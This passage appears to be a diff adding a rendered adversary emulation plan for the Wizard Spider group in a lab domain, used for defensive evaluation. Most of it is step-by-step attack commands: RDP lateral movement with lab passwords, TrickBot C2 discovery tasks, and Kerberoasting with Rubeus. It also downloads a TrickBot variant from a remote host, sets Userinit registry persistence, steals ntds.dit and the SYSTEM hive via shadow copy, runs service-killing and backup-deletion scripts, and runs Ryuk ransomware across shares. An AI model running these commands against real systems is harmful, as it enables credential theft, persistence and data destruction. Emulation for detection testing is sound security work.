+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h4>
+</doc-anchor-target>
+<p>Change your RDP tab name to &quot;RDP into Toto&quot;</p>
+<p>RDP into Toto and create RDP drive that has TrickBot folder structure</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Wizard Spider has used RDP for lateral movement.[5][2][8]
+
+cd ~/
+xfreerdp +clipboard /u:oz\\bill /p:&quot;Fall2021&quot; /v:10.0.0.8 /drive:X,wizard_spider/Resources/TrickBot/WNetval</code></pre>
+</doc-codeblock></div>
+<p>Open <code v-pre>CMD.exe</code> and copy file to bill&#x27;s AppData\Roaming</p>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> make sure you&#x27;re in a <code v-pre>CMD</code> shell</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">copy \\tsclient\X\TrickBotClientExe.exe %AppData%\uxtheme.exe</code></pre>
+</doc-codeblock></div>
+<p>Kick off exeuction by starting TrickBotClientExe.exe</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">cd %AppData%
+uxtheme.exe</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cited-intelligence">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h4>
+</doc-anchor-target>
+<ul>
+<li><p><a href="https://attack.mitre.org/groups/G0102/">https://attack.mitre.org/groups/G0102/</a></p>
+</li>
+<li><p><a href="https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/">https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/</a></p>
+</li>
+</ul>
+<doc-anchor-target id="step-5---trickbot-discovery">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-5---trickbot-discovery">#</doc-anchor-trigger>
+        <span>Step 5 - TrickBot Discovery</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>In step 5 Wizard Spider uses TrickBot to perform detailed system discovery.</p>
+<p>You will see TrickBot executing shell commands, such as systeminfo, sc.exe, net.exe, and so on.</p>
+<p>Trickbot executes commands via the C standard library function, <code v-pre>system()</code>.</p>
+<doc-anchor-target id="procedures">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h4>
+</doc-anchor-target>
+<p>Switch back to your C2 terminal window.</p>
+<p>Execute the following commands.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># TrickBot gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.[1][2][7][12]
+
+./evalsC2client.py --set-task TrickBot-Implant &quot;systeminfo &gt; discovery.txt&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># TrickBot collects a list of install programs and services on the system’s machine.[1]
+
+./evalsC2client.py --set-task TrickBot-Implant &quot;sc query &gt;&gt; discovery.txt&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># TrickBot collects the users of the system.[1][6]
+
+./evalsC2client.py --set-task TrickBot-Implant &quot;net user &gt;&gt; discovery.txt&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task TrickBot-Implant  &quot;net user /domain &gt;&gt; discovery.txt&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.[1][6][7]
+
+./evalsC2client.py --set-task TrickBot-Implant &quot;ipconfig /all&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task TrickBot-Implant &quot;netstat -tan&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Trickbot gathers domain specfic/client specfic information
+./evalsC2client.py --set-task TrickBot-Implant &quot;net config workstation &gt;&gt; discovery.txt&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task TrickBot-Implant &quot;nltest /domain_trusts /all_trusts &gt;&gt; discovery.txt&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># TrickBot can identify the groups the user on a compromised host belongs to.[7]
+
+./evalsC2client.py --set-task TrickBot-Implant &quot;whoami /groups &gt;&gt; discovery.txt&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cited-intelligence">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h4>
+</doc-anchor-target>
+<ul>
+<li><a href="https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf">https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf</a></li>
+<li><a href="https://www.fidelissecurity.com/threatgeek/2016/10/trickbot-we-missed-you-dyre">https://www.fidelissecurity.com/threatgeek/2016/10/trickbot-we-missed-you-dyre</a></li>
+<li><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/">https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/</a></li>
+<li><a href="https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware">https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware</a></li>
+<li><a href="https://eclypsium.com/wp-content/uploads/2020/12/TrickBot-Now-Offers-TrickBoot-Persist-Brick-Profit.pdf">https://eclypsium.com/wp-content/uploads/2020/12/TrickBot-Now-Offers-TrickBoot-Persist-Brick-Profit.pdf</a></li>
+</ul>
+<doc-anchor-target id="step-6---kerberoast-the-dc">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-6---kerberoast-the-dc">#</doc-anchor-trigger>
+        <span>Step 6 - Kerberoast the DC</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>In this step Wizard Spider performs Kerberoasting using a public tool, Rubeus.</p>
+<p>Through Kerberoasting, Wizard Spider obtains encrypted credentials for the domain admin, vfleming.</p>
+<p>Wizard Spider cracks the credentials offline for use in the next step.</p>
+<p><em>Note: offline cracking isn&#x27;t performed due to time constraints; its also not in scope for the evaluation, so we skip the behavior.</em></p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h4>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Wizard Spider has used Rubeus, MimiKatz Kerberos module, and the Invoke-Kerberoast cmdlet to steal AES hashes.[6][3][2][8]
+
+./evalsC2client.py --set-task TrickBot-Implant &quot;get-file rubeus.exe&quot;</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task TrickBot-Implant &quot;rubeus.exe kerberoast /domain:oz.local&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cited-intelligence">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h4>
+</doc-anchor-target>
+<ul>
+<li><a href="https://us-cert.cisa.gov/ncas/alerts/aa20-302a">https://us-cert.cisa.gov/ncas/alerts/aa20-302a</a></li>
+<li><a href="https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html">https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html</a></li>
+<li><a href="https://thedfirreport.com/2020/10/08/ryuks-return/">https://thedfirreport.com/2020/10/08/ryuks-return/</a></li>
+<li><a href="https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/">https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/</a></li>
+</ul>
+<br>
+<doc-anchor-target id="test-3-step-7">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-3-step-7">#</doc-anchor-trigger>
+        <span>Test 3 (Step 7)</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="step-7---lateral-movement-to-dc">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-7---lateral-movement-to-dc">#</doc-anchor-trigger>
+        <span>Step 7 - Lateral Movement to DC</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>In step 7 Wizard Spider RDP&#x27;s into the domain controller as user vfleming.</p>
+<p>Wizard Spider dowloads a TrickBot variant to the DC using PowerShell&#x27;s <code v-pre>Invoke-WebRequest</code> command.</p>
+<p>Wizard Spider then establishes registry persistence to execute Trickbot when vflemming logs in.</p>
+<p>Lastly, Wizard Spider enumerates the domain using the <code v-pre>adfind</code> utility.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">Compromised user info:
+
+User:	vfleming@oz.local
+
+System: 10.0.0.4 / wizard
+
+File Write (Tribot EXE variant): %AppData%\uxtheme.exe
+
+Registry Write:  HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
+
+Key: Userinit
+
+Value: Userinit.exe, $env:AppData\uxtheme.exe</code></pre>
+</doc-codeblock></div>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Go back to your Toto RDP session and sign out: <code v-pre>Right-click Windows icon -&gt; Shut down or sign out -&gt; Sign out</code></p>
+<p>Rename your RDP terminal to &quot;RDP to wizard&quot;</p>
+<p>RDP to wizard / 10.0.0.4.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Wizard Spider has used RDP for lateral movement.[5][2][8]
+
+xfreerdp +clipboard /u:oz\\vfleming /p:&quot;q27VYN8xflPcYumbLMit&quot; /v:10.0.0.4 /drive:X,wizard_spider/Resources/Ryuk/bin</code></pre>
+</doc-codeblock></div>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Open an <strong>administrator powershell</strong>.</p>
+<p>Download a trickbot variant (same binary with a zero appended to the very end)</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.[3]
+
+Invoke-WebRequest -Uri http://192.168.0.4:8080/getFile/uxtheme.exe -OutFile $env:AppData\uxtheme.exe</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">Set-ItemProperty &quot;HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&quot; &quot;Userinit&quot; &quot;Userinit.exe, $env:AppData\uxtheme.exe&quot; -Force</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Wizard Spider has also used AdFind and nltest/dclist to enumerate domain computers, including the domain controller.[4][5][3][7][6]
+
+adfind -f &quot;(objectcategory=group)&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><a href="https://us-cert.cisa.gov/ncas/alerts/aa20-302a">https://us-cert.cisa.gov/ncas/alerts/aa20-302a</a></li>
+<li><a href="https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html">https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html</a></li>
+<li><a href="https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/">https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/</a></li>
+<li><a href="https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/">https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/</a></li>
+<li><a href="https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html">https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html</a></li>
+<li><a href="https://thedfirreport.com/2020/10/08/ryuks-return/">https://thedfirreport.com/2020/10/08/ryuks-return/</a></li>
+<li><a href="https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/">https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/</a></li>
+</ul>
+<doc-anchor-target id="test-4-step-8">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-4-step-8">#</doc-anchor-trigger>
+        <span>Test 4 (Step 8)</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="step-8---dump-active-directory-database-ntdsdit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-8---dump-active-directory-database-ntdsdit">#</doc-anchor-trigger>
+        <span>Step 8 - Dump Active Directory Database (ntds.dit)</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>During step 8, Wizard Spider creates a volume shadow copy in order to collect the active directory database (ntds.dit).</p>
+<p>Wizard Spider uses vssadmin to create the shadow copy.</p>
+<p>Wizard Spider exfiltrates the shadow copy files using an RDP-mounted network share.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Spawn a <strong>CMD</strong> shell within your PowerShell window:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">cmd.exe</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">cls</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database.[3]
+
+vssadmin.exe create shadow /for=C:</code></pre>
+</doc-codeblock></div>
+<p>You will get output resembling the following:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">vssadmin output:
+    Shadow Copy ID: {cb0a1e0b-e4d7-44f4-aacb-daed56db01ce}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</code></pre>
+</doc-codeblock></div>
+<p><span class="docs-emoji">&#x26A0;&#xFE0F;</span> Make sure the <code v-pre>\\\\?\GLOBALROOT...HarddiskVolumeShadowCopy1</code> path matches your output!</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit \\TSCLIENT\X\ntds.dit</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM \\TSCLIENT\X\VSC_SYSTEM_HIVE</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">reg SAVE HKLM\SYSTEM \\TSCLIENT\X\SYSTEM_HIVE</code></pre>
+</doc-codeblock></div>
+<p>Notionally, Wizard Spider carves credentials offline from ntds.dit using tools like Impacket&#x27;s secretsdump.py</p>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><a href="https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html">https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html</a></li>
+</ul>
+<br>
+<doc-anchor-target id="test-5-step-9">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-5-step-9">#</doc-anchor-trigger>
+        <span>Test 5 (Step 9)</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="step-9---ryuk-inhibit-system-recovery">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-9---ryuk-inhibit-system-recovery">#</doc-anchor-trigger>
+        <span>Step 9 - Ryuk Inhibit System Recovery</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>In step 9, Wizard Spider prepares to deploy an executable based on the Ryuk ransomware.</p>
+<p>At the beginning of this step, Wizard Spider mounts the C$ share of a lateral host, toto / 10.0.0.8.</p>
+<p>Files on Toto will be encrypted in the next step.</p>
+<p>Next, Wizard Spider uploads two files to disk: kill.bat and window.bat.</p>
+<p>These files are used to stop specific services and delete backups prior to encrypting the system.</p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>In the CMD session, mount share so Ryuk can encrypt lateral drives:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-batch"><code v-pre class="language-batch">net use Z: \\10.0.0.8\C$</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Ryuk has called kill.bat for stopping services, disabling services and killing processes.[1]
+
+# Ryuk can launch icacls /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories.[4]
+
+# Ryuk has stopped services related to anti-virus.[2]
+
+copy \\TSCLIENT\X\kill.bat C:\Users\Public\kill.bat
+
+C:\Users\Public\kill.bat</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/ryuk/bin/kill.bat">Source Code</a></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Ryuk has used vssadmin Delete Shadows /all /quiet to to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.[1]
+
+copy \\TSCLIENT\X\window.bat C:\Users\Public\window.bat
+
+C:\Users\Public\window.bat</code></pre>
+</doc-codeblock></div>
+<p><a href="../../resources/ryuk/bin/window.bat">Source Code</a></p>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><a href="https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/">https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/</a></li>
+<li><a href="https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html">https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html</a></li>
+<li><a href="https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf">https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf</a></li>
+</ul>
+<br>
+<doc-anchor-target id="test-6-step-10">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#test-6-step-10">#</doc-anchor-trigger>
+        <span>Test 6 (Step 10)</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="step-10---ryuk-encryption-for-impact">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#step-10---ryuk-encryption-for-impact">#</doc-anchor-trigger>
+        <span>Step 10 - Ryuk Encryption for Impact</span>
+    </h3>
+</doc-anchor-target>
+<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
+<p>In our final test, Wizard Spider uploads and executes Ryuk.</p>
+<p>Ryuk is uploaded using the RDP-mounted network share, and executed from CMD.</p>
+<p>When Ryuk executes, it will first gain <code v-pre>SeDebugPrivilege</code>.</p>
+<p>Ryuk will then and inject its own executable into a remote process,notepad.exe, via <code v-pre>WriteProcessMemory</code> and <code v-pre>CreateRemoteThread</code> WinAPI calls.</p>
+<p>From the remote process, Ryuk will encrypt files on wizard/10.0.0.4&#x27;s C:\Users\Public directory (recursive).</p>
+<p>Next, Ryuk encrypts files on Toto/10.0.0.8 at \C$\Users\Public (mounted on wizard as Z:).</p>
+<p>Ryuk uses a symmetric key algorithm, AES256 to encrypt files.</p>
+<p>Note that the symmetric key is itself encrypted with RSA2048.</p>
+<p><em>Note: early versions of our Ryuk emulation encrypted the entire filesystem; however, this proces took hours, rather than minutes, so we scaled it back due to time constraints.</em></p>
+<hr>
+<doc-anchor-target id="procedures">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
+    </h3>
+</doc-anchor-target>
+<p>From the pre-existing CMD session, run the following:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># Ryuk has attempted to adjust its token privileges to have the SeDebugPrivilege.[11]
+
+# Ryuk has called CreateToolhelp32Snapshot to enumerate all running processes.[1]
+
+# Ryuk has injected itself into remote processes to encrypt files using a combination of VirtualAlloc, WriteProcessMemory, and CreateRemoteThread.[1]
+
+# Ryuk has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.[1]
+
+# Ryuk has used the C$ network share for lateral movement.[5]
+
+# Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol (ARP) entries.[1][5]
+
+copy \\TSCLIENT\X\ryuk.exe C:\Users\Public\ryuk.exe</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">C:\Windows\System32\notepad.exe</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">C:\Users\Public\ryuk.exe --encrypt --process-name notepad.exe</code></pre>
+</doc-codeblock></div>
+<p>To confirm that encryption worked, execute the following in CMD:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash"># confirm files are encrypted (local)
+type C:\Users\Public\Documents\Whitepaper_ekFUNt.rtf
+
+# confirm encryption (remote)
+type \\toto\C$\Users\Public\Documents\Whitepaper_ekFUNt.rtf</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="cited-intelligence">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
+        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
+    </h3>
+</doc-anchor-target>
+<ul>
+<li><a href="https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/">https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/</a></li>
+<li><a href="https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/">https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/</a></li>
+<li><a href="https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/">https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/</a></li>
+<li><a href="https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf">https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf</a></li>
+<li><a href="https://n1ght-w0lf.github.io/malware%20analysis/ryuk-ransomware/">https://n1ght-w0lf.github.io/malware%20analysis/ryuk-ransomware/</a></li>
+</ul>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                                <nav class="flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/wizard_spider/emulation_plan/scenario_1/infrastructure/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                                                <span class="block mt-1">Scenario 1 Infrastructure</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/wizard_spider/emulation_plan/scenario_2/infrastructure/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
+                                                <span class="block mt-1">Scenario 1 Infrastructure</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between">
+                                <div>
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
